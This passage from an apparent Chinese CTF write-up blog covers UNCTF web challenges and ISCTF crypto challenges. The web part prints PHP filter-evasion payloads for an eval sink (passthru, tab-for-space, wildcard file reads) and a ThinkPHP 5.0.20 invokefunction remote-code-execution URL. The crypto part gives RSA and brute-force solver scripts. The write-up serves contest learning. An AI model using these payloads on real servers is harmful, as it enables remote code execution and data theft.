一直到2020140</p><p>得到flag</p><p>UNCTF{bfff6d206cbcd6ac0870a4f48c7c313b}</p><h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>先扫描根目录发现了index.php文件  然后访问得到</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP"> &lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_POST[&quot;a&quot;]))&#123;    if($_POST[&quot;a&quot;]&#x3D;&#x3D;0&amp;&amp;$_POST[&quot;a&quot;]!&#x3D;&#x3D;0)&#123;        if(isset($_POST[&quot;key1&quot;])&amp;isset($_POST[&quot;key2&quot;]))&#123;            $key1&#x3D;$_POST[&quot;key1&quot;];            $key2&#x3D;$_POST[&quot;key2&quot;];            if ($key1!&#x3D;&#x3D;$key2&amp;&amp;sha1($key1)&#x3D;&#x3D;sha1($key2))&#123;                if (isset($_GET[&quot;code&quot;]))&#123;                    $code&#x3D;$_GET[&quot;code&quot;];                    if(!preg_match(&quot;&#x2F;flag|system|txt|cat|tac|sort|shell|\.| |\&#39;&#x2F;i&quot;, $code))&#123;                        eval($code);                    &#125;else&#123;                        echo &quot;有手就行&lt;&#x2F;br&gt;&quot;;                    &#125;                &#125;else&#123;                    echo &quot;老套路了&lt;&#x2F;br&gt;&quot;;                &#125;            &#125;else&#123;                echo &quot;很简单的，很快就拿flag了~_~&lt;&#x2F;br&gt;&quot;;            &#125;        &#125;else&#123;            echo &quot;百度就能搜到的东西&lt;&#x2F;br&gt;&quot;;        &#125;    &#125;else&#123;        echo &quot;easy 不 easy ,baby 真 baby,都是玩烂的东西，快拿flag！！！&lt;&#x2F;br&gt;&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后通过POST传入参数a利用科学计数法绕过第一层</p><p>然后是绕过sha1  利用数组绕过</p><p>POST绕过payload</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;s878926199a&amp;key1[]&#x3D;1&amp;key2[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后是GE传参</p><p>过滤了  flag|system|txt|cat|tac|sort|shell|.| |&#39;   还过滤了空格  %20  %27</p><p>可以利用passthru绕过system  利用双引号绕过单引号   利用  %09绕过空格</p><p>利用  ?code&#x3D;passthru(“ls%09&#x2F;“);得到</p><p><img src="/2023/02/01/UNCTF/1668656852081.png" alt="1668656852081"></p><p>可以发现有flag.txt  但是   cat   flag  txt   .  都被过滤</p><p>利用more 绕过  cat  利用  * 绕过   flag  txt .</p><p>payload</p><p>?code&#x3D;passthru(“more%09&#x2F;fl*”);</p><p><img src="/2023/02/01/UNCTF/1668657007376.png" alt="1668657007376"></p><p>UNCTF{99hanDis_pHP_Ba_True_flag}</p><h1 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h1><p>通过查找页面源代码  发现main.js 然后打开js代码   搜索unctf得到</p><p><img src="/2023/02/01/UNCTF/1668659315693.png" alt="1668659315693"></p><p>把它们连接经过尝试得到flag</p><p>UNCTF{c5f9a27d-6f88-49fb-a510-fe7b163f8dd3}</p><h1 id="给你一刀"><a href="#给你一刀" class="headerlink" title="给你一刀"></a>给你一刀</h1><p><img src="/2023/02/01/UNCTF/1668660124391.png" alt="1668660124391"></p><p>打开题目是这样一个页面 应该是thinphp漏洞  然后随便通过一个GET传参发现是thinkphp5.0.20漏洞</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;d1021445-6982-4789-b0d2-b6ba3ffe304e.node.yuzhian.com.cn&#x2F;index.php?s&#x3D;&#x2F;Index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;-1&#96;%20and%20it%27ll%20execute%20the%20phpinfo%EF%BC%9A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到phpinfo页面  然后直接搜索  unctf</p><p><img src="/2023/02/01/UNCTF/1668660310042.png" alt="1668660310042"></p><p>UNCTF{Y0u_A3r_so_G9eaD_hacker} </p>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022ISCTF</title>
      <link href="/2023/02/01/ISCTF/"/>
      <url>/2023/02/01/ISCTF/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">rank:3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="这是什么古典玩意"><a href="#这是什么古典玩意" class="headerlink" title="这是什么古典玩意"></a>这是什么古典玩意</h2><p>第一部分  先base64解码   IJWHKZKTNBQXE2Y&#x3D;    base32  解密    BlueShark</p><p>第二部分  先用十六进制转化为Unicode码    \u53\u65\u65\u6D\u73\u53\u3    然后转化为字符  SeemsS0</p><p>第三部分   猪圈密码    cute</p><p>然后连在一起就是flag</p><p>ISCTF{BlueShark_SeemsS0_cute}</p><h2 id="呜呜呜我的md5脏了"><a href="#呜呜呜我的md5脏了" class="headerlink" title="呜呜呜我的md5脏了"></a>呜呜呜我的md5脏了</h2><p>I{i?8Sms??Cd_1?T51??F_1?}</p><p>由所给的这个字符串判断应该先进行栅栏解密当key&#x3D;5的时候得到</p><p>ISCTF{md5_is_11??1??8???}</p><p>然后进行脚本解密</p><p>脚本如下</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">import hashlibc &#x3D; &#39;ISCTF&#123;md5_is_11??1??8???&#125;&#39;m &#x3D; &#39;88875458bdd87af5dd2e3c750e534741&#39;for i in &#39;1234567890&#39;:    c1 &#x3D; c.replace(&#39;?&#39;,i,1)    for j in &#39;1234567890&#39;:        c2 &#x3D; c1.replace(&#39;?&#39;,j,1)        for p in &#39;1234567890&#39;:            c3 &#x3D; c2.replace(&#39;?&#39;, p, 1)            for q in &#39;1234567890&#39;:                c4 &#x3D; c3.replace(&#39;?&#39;, q, 1)                for a in &#39;1234567890&#39;:                    c5 &#x3D; c4.replace(&#39;?&#39;, a, 1)                    for b in &#39;1234567890&#39;:                        c6 &#x3D; c5.replace(&#39;?&#39;, b, 1)                        for d in &#39;1234567890&#39;:                            c7 &#x3D; c6.replace(&#39;?&#39;, d, 1)                            s &#x3D; hashlib.md5()                            s.update(c7.encode(&#39;utf-8&#39;))                            flag &#x3D;s.hexdigest()                            if flag &#x3D;&#x3D; m:                                print(c7)  #ISCTF&#123;md5_is_11451438324&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="咦-这个密码-怎么怪怪的"><a href="#咦-这个密码-怎么怪怪的" class="headerlink" title="咦 这个密码 怎么怪怪的"></a>咦 这个密码 怎么怪怪的</h2><p>JVAB6NR&#x3D;<br>FCFOQCB&#x3D;<br>JG6NSTP&#x3D;<br>UPM4BGU&#x3D;<br>GN3VKM&#x3D;&#x3D;</p><p>题目给了这五段base编码后的字符串，分别base解密后得到的不是正确结果</p><p>然后感觉是栅栏密码分组后的</p><p>然后先还原JFJUGVCGPNAF6M3BON4V6QSBKNCTGMRBPU&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>然后base32解码得    </p><p>ISCTF{@_3asy_BASE32!}</p><h2 id="ezcry"><a href="#ezcry" class="headerlink" title="ezcry"></a>ezcry</h2><p>已知n,c,seek1,seek2,seek3只需求得p,q就可以求得flag</p><p>先尝试用方程组求得p,q,s,k但是有4个未知数，但是只能列出三个方程</p><p>然后发现seek3可以分解  分解之后就很容易求出p,q了</p><p>然后列两个方程求出p,q然后求出flag</p><p>脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">17034526359906374675222899048129793386473729727961851733668266173715506273934226618903915327347680201386438684211280871430960401386916021458749533875225149368757915582850037170031336862864220965224712317292408675261654733853726119671544885158743864358155418727967683788352892259519172776767011253307992508658787036093010953540438865556151687132667690293590304094069132122821611257522409132491206241878258953750975043892338280574703622715614385904469190033441247428911800257097240824225432194243602777112774675510936575635571170740329720227162079500469956310746873132644419840611848333802207608652869080821316814006039</span>seek1 <span class="token operator">=</span> <span class="token number">31064534580137722018723185060822560614595271317101024671103834301982025703308358280617670492170754990183711198694392500995348706299728134379707212369534471489902209545060592051514886997951859233729914969365008090709174580598044945031296428531946547802954873288796478626936584991410702713951383782424003825610226728036611739090258953115031673157531</span>seek2 <span class="token operator">=</span> <span class="token number">24213197274140919663950771475506320265583015671558310318006684746019240494812396672068641326932339831508586851960432536051863105773343184877340119017546817780287117748145293115469964769795237573829418533841547969451268532899237529671580701722254679851009751345719473395857872899046537572034595080443184983155696803469587776652323407147950333716539</span><span class="token comment"># seek3 = 44155715757886274586781970607943060213741487009882893164192666734219021562031</span>k <span class="token operator">=</span> <span class="token number">176868710737612660790124725586933365207</span>s <span class="token operator">=</span> <span class="token number">249652499719930280463165749259207398633</span>c <span class="token operator">=</span> <span class="token number">6636871845889289821451339461667353441602430792099749101933216934629214305159040913567522609116395485018234259025910227221402350884391969711051377864656945164699379734982178962637190192088596776288873871651609167259167456816094141938735498585327839045360319836147041837569528592447701501104067430848582239927052031661696213986982946173792468753773505681630323945625892041031455025095934790620541499679023777086690062211807019645557781380979957862910047981754126193036968611612056475750787560328372643151874535031184052794483578557248028165948247504989100884012688908781349748818365779371062209169311607720595792421590</span>p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span>f1 <span class="token operator">=</span>p<span class="token operator">*</span>s <span class="token operator">-</span> seek1f2 <span class="token operator">=</span> q<span class="token operator">*</span>k <span class="token operator">-</span> seek2result <span class="token operator">=</span> sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span><span class="token punctuation">[</span>f1<span class="token punctuation">,</span>f2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>p<span class="token punctuation">,</span>q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># p = result[0][0]</span><span class="token comment"># q = result[0][1]</span>p <span class="token operator">=</span> <span class="token number">124431097685731585500751867561577386168625841833110547803689338621205694806894593800890539870901241604771309656881714338980632734600555998963734012020140199718421450936912672638698198874438316460684901133302344433574864927296261487308172012685704080591703927800706930307570111656989099386334418808318738228707</span>q <span class="token operator">=</span> <span class="token number">136899269368574494181432774464678202037635589190950946226297544277459575545677315054120424232811345008456618479471930375486284959459949992475679011596136875096300441920570897559993673334614086077512235940271412778240309588973215899038656984058786224113488739164322245715370193417530133818250200774863603490877</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#ISCTF&#123;iiii|||yesyes||7777&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>已知e,phi,c</p><p>可以先直接求出d</p><p>然后需要求p,q</p><p>由于p,q是相邻的两个素数  可以根据先对phi开平方</p><p>  r &#x3D; gmpy2.iroot(phi,2)</p><p>然后求出r后面的一个素数记为q  然后根据phi列方程求出  p</p><p>然后求出n</p><p>然后即得flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">import</span> sympye <span class="token operator">=</span> <span class="token number">0x10001</span>phi <span class="token operator">=</span> <span class="token number">11998145197184838105291668748328177280207361667546370722759758550200386112478801305683579153942751165452647656673385449297455560085865712968985383490367475984832103238596934094135353170257339614559178443729484992289380330326343473326373076256926770972074683466001586625109364413771716300886242679064050279982192814946404692347546718488456485946902248120569680365122714051066115263800073280766317934165938044443605816890762489369759667593014079143278938847700684310154017484382180324831332527966465023501690149664921975200082428884572496102388046780321762496321487913829155767534947229165886644311869593584303424397016</span><span class="token comment"># r = 109536045196021378473484632066472150683521336347358874526866331690092816367179030745104763602807576505784282588391579330792050561206606208658316946611185794570291516186946574151436992714139093506271221446818524824573954054758828492925882010545627804144648642873153564353555136207966912120214314518375212161620</span>c <span class="token operator">=</span> <span class="token number">5664235030100231880171042228110930207351619841860785495929861788749956436657598539033166266920085041056539484368799525891006461921744810454002229224070342640529484554920046100814190479604751667796353636578589439575896923937945959721385425716210546145718343511555866077148390467362495462929359632111674082222918151696522137240478900570056689827712787018876034334301771868147820786419006234529563416734953393480238739362002713175495890402512002469332947145115452344040709333447223824491510840788018172189866931550385951940611161143400804317944263940630025758568750312753125034413169961147691163044924934280636235493483</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>phi<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">#先把phi开方求得r然后求r后面的一个素数  即为  q然后  在列方程求出  p</span>q  <span class="token operator">=</span> <span class="token number">109536045196021378473484632066472150683521336347358874526866331690092816367179030745104763602807576505784282588391579330792050561206606208658316946611185794570291516186946574151436992714139093506271221446818524824573954054758828492925882010545627804144648642873153564353555136207966912120214314518375212162597</span>p  <span class="token operator">=</span> <span class="token number">109536045196021378473484632066472150683521336347358874526866331690092816367179030745104763602807576505784282588391579330792050561206606208658316946611185794570291516186946574151436992714139093506271221446818524824573954054758828492925882010545627804144648642873153564353555136207966912120214314518375212160647</span><span class="token comment"># p = sympy.Symbol('p')</span><span class="token comment"># q = gmpy2.next_prime(r)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>f1 <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>phiresult<span class="token operator">=</span>sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>f1<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>blueshark<span class="token punctuation">&#123;</span>ISctf_i4_interest1ng<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>blueshark{ISctf_i4_interest1ng}</p><h2 id="韩信点兵"><a href="#韩信点兵" class="headerlink" title="韩信点兵"></a>韩信点兵</h2><p>根据所给源代码亿以及所给的输出的文件</p><p>第一行应该是第一个字母经过源代码的变换得到的</p><p>盲猜前五个字母应该是     ISCTF</p><p>然后写脚本爆破key</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#先爆破k  由给的附件得应该是每一行代表一个字母    第一个字母应该是   I</span><span class="token comment">#然后用第二个字母爆破k得到的还是    63311</span><span class="token comment">#第三个爆破出来也是63311</span>p1 <span class="token operator">=</span> <span class="token number">60719</span>p2 <span class="token operator">=</span> <span class="token number">41941</span><span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> key    <span class="token keyword">if</span> i<span class="token operator">%</span>p1 <span class="token operator">==</span>  <span class="token number">2732</span> <span class="token keyword">and</span> i<span class="token operator">%</span>p2 <span class="token operator">==</span> <span class="token number">21510</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token comment">#KEY = 63311</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后根据中国剩余定理可以求出经过第一次变换后的字符</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span><span class="token keyword">def</span> <span class="token function">CRT</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> ai<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span>    <span class="token comment"># Chinese Remainder Theorem</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>ai<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    M <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">*</span> y<span class="token punctuation">,</span> mi<span class="token punctuation">)</span>    ai_ti_Mi <span class="token operator">=</span> <span class="token punctuation">[</span>a <span class="token operator">*</span> <span class="token punctuation">(</span>M <span class="token operator">//</span> m<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>M <span class="token operator">//</span> m<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> ai<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">+</span> y<span class="token punctuation">,</span> ai_ti_Mi<span class="token punctuation">)</span> <span class="token operator">%</span> M<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后爆破还原</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">'1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;!@#&#125;?$%^&amp;*()-=\&lt;>/'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> wp <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后写成一个脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span><span class="token keyword">def</span> <span class="token function">CRT</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> ai<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span>    <span class="token comment"># Chinese Remainder Theorem</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>ai<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    M <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">*</span> y<span class="token punctuation">,</span> mi<span class="token punctuation">)</span>    ai_ti_Mi <span class="token operator">=</span> <span class="token punctuation">[</span>a <span class="token operator">*</span> <span class="token punctuation">(</span>M <span class="token operator">//</span> m<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>M <span class="token operator">//</span> m<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> ai<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">+</span> y<span class="token punctuation">,</span> ai_ti_Mi<span class="token punctuation">)</span> <span class="token operator">%</span> Mkey <span class="token operator">=</span> <span class="token number">63311</span>mi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2732</span> <span class="token punctuation">,</span><span class="token number">21510</span><span class="token punctuation">]</span>     <span class="token comment">#后两列数据</span>ai <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">60719</span> <span class="token punctuation">,</span><span class="token number">41941</span><span class="token punctuation">]</span>    <span class="token comment">#前两列数据</span>m <span class="token operator">=</span> CRT<span class="token punctuation">(</span>ai<span class="token punctuation">,</span>mi<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">'1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;!@#&#125;?$%^&amp;*()-=\&lt;>/'</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> m <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后每次运行换成下一行的数据  最后连起来得</p><p>ISCTF{6e0f1ad4-96a6-4b77-867d-0c69cb7ad019}</p><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>根据题目得这是一个典型的phi和n不互素问题直接套用脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 当e约去公约数后与phi互素</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> e<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> p <span class="token operator">*</span> q    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e <span class="token operator">//</span> t<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    msg <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span> t<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token keyword">if</span> msg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token number">146061540583135242741006647792481468215928177245453689591382075771990192360040412020479342624228118794110240955451899373848827328177557126556072570082923983968091404980923313006963667391261364191537502509633623502033578910844508808321175673461956149400289968262858691371016246515264343715246136003074155184273</span>q <span class="token 